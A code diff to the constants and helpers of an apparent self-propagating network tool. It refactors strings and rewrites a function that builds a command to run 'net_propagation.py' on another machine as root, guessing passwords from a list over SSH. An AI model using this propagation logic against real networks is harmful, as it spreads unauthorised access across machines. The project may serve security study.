@@ -33,14 +33,8 @@ ARGUMENT_HELP_SHORT = "-h"
 # Argument to denote the need for further help, just the long version.
 ARGUMENT_HELP_LONG = "--help"
 
-#
+# Prompt to let people know arguments are being assigned for testing.
 ASSIGNING_ARGUMENTS = "Assigning arguments as part of test"
-
-# Blank IP addresses, mostly for test purposes.
-BLANK_IP = "0.0.0.0"
-
-# Just a blank string, no point assigning multiple of these to memory. :)
-BLANK_STRING = ""
 
 # A string that states that the IP and port pair is closed.
 CLOSED_IP_PORT_PAIR = "This IP address and port pair is closed"
@@ -114,7 +108,7 @@ LOOPBACK = "lo"
 MAIN = "main()"
 
 # The name of the net propagation script.
-NET_PROPAGATION = "net_propagation.py"
+NET_PROPAGATION = "src/net_propagation.py"
 
 # Just the numerical form of the number one, again, memory preservation.
 ONE = "1"
@@ -181,6 +175,8 @@ SUCCESSFUL = "Successful"
 # The syn flag for packet crafting in Scapy
 SYN_FLAG = "S"
 
+# Test IP addresses.
+TEST_IP = "192.168.1.1"
 
 # Letting the user know a file couldn't be transferred over SSH default port.
 TRANSFER_FAILURE_SSH = "File couldn't be transferred over port 22 / SSH"
@@ -413,16 +409,15 @@ def help_output():
         ARGUMENT_PWS_FILENAME + " " + PWDS_LIST
 
 
-def run_script_command(filename):
+def run_script_command():
     """
     This function will run the propagation script on another target machine
     over any service
-    :param filename: The file that holds the propagation script
-    :return "net_propagation.py -L -p 22,23 -u " + username + " -f
+    :return "net_propagation.py -L -p 22 -u " + username + " -f
     passwords.txt
     -P": The command itself
     """
-    return filename + " -L -p 22,23 -u " + ROOT + " -f passwords.txt -P"
+    return NET_PROPAGATION + " -L -p 22 -u " + ROOT + " -f passwords.txt -P"
 
 
 def web_login_url(ip, port):
